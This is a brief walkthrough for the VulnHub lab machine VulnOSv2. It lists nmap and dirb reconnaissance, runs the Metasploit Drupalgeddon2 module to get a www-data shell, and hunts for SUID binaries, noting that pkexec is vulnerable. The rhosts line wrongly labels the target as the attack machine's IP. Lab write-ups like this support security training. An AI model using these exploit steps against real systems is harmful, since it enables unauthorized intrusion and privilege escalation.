

# VulnOSv2 Walkthrough 

**VulnHub Link:** [VulnOSv2](https://www.vulnhub.com/entry/vulnos-2,147/)
**Difficulty:** Easy
**Release Date:** 17 May 2016

## 1.Reconnaissance
```bash
nmap -A -O -T4 -P -sV 192.168.100.178
```


## 2.Web Enumeration

```bash
dirb http://192.168.100.178
```

we found out that drupal run in web

```bash
msfconsole -q
use unix/webapp/drupal_drupalgeddon2
set rhosts <attack machine ip>
set TARGETURI /jabc/
run
```

www-data session opened

find / -perm /4000 2>/dev/null

observe that pkexec vuln exist in this machine


